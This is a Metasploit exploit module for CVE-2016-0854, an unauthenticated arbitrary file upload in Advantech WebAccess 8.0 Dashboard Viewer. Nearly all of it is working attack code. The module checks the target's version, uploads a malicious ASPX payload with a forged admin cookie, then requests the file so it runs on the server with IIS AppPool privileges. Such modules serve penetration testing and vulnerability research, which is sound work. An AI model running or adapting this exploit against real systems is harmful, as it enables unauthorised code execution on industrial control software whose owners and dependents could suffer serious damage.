##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Advantech WebAccess Dashboard Viewer Arbitrary File Upload",
      'Description'    => %q{
         This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0.

         This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations
         of Advantech WebAccess. Authentication is not required to exploit this vulnerability.

         The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within
         the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to
         upload arbitrary code (instead of an image) to the server, which will then be executed under the
         high-privilege context of the IIS AppPool.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'rgod', # Vulnerability discovery
        'Zhou Yu <504137480[at]qq.com>' # MSF module
      ],
      'References'     => [
        [ 'CVE', '2016-0854' ],
        [ 'ZDI', '16-128' ],
        [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-014-01']
      ],
      'Platform'      => 'win',
      'Targets'       => [
        ['Advantech WebAccess 8.0', {}]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 5 2016",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path of Advantech WebAccess 8.0', '/'])
      ], self.class)
  end

  def version_match(data)
    # Software Build : 8.0-2015.08.15
    fingerprint = data.match(/Software\sBuild\s:\s(?<version>\d{1,2}\.\d{1,2})-(?<year>\d{4})\.(?<month>\d{1,2})\.(?<day>\d{1,2})/)
    fingerprint['version'] unless fingerprint.nil?
  end

  def vuln_version?
    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => target_uri.to_s
    )

    if res.redirect?
      res = send_request_cgi(
        'method' => 'GET',
        'uri'    => normalize_uri(res.redirection)
      )
    end

    ver = res && res.body ? version_match(res.body) : nil
    true ? Gem::Version.new(ver) == Gem::Version.new('8.0') : false
  end

  def check
    if vuln_version?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def upload_file?(filename, file)
    uri = normalize_uri(target_uri, 'WADashboard', 'ajax', 'UploadAjaxAction.aspx')

    data = Rex::MIME::Message.new
    data.add_part('uploadFile', nil, nil, 'form-data; name="actionName"')
    data.add_part(file, nil, nil, "form-data; name=\"file\"; filename=\"#{filename}\"")

    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     => uri,
      'cookie'  => "waUserName=admin",
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'data'    => data.to_s
    )
    true ? res && res.code == 200 && res.body.include?("{\"resStatus\":\"0\",\"resString\":\"\/#{filename}\"}") : false
  end

  def exec_file?(filename)
    uri = normalize_uri(target_uri)
    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     => uri
    )

    uri = normalize_uri(target_uri, 'WADashboard', filename)
    res = send_request_cgi(
      'method'   => 'GET',
      'uri'      => uri,
      'cookie'   => res.get_cookies
    )
    true ? res && res.code == 200 : false
  end

  def exploit
    unless vuln_version?
      print_status("#{peer} - Cannot reliably check exploitability.")
      return
    end
    filename = "#{Rex::Text.rand_text_alpha(5)}.aspx"
    filedata = Msf::Util::EXE.to_exe_aspx(generate_payload_exe)

    print_status("#{peer} - Uploading malicious file...")
    return unless upload_file?(filename, filedata)

    print_status("#{peer} - Executing #{filename}...")
    return unless exec_file?(filename)
  end
end
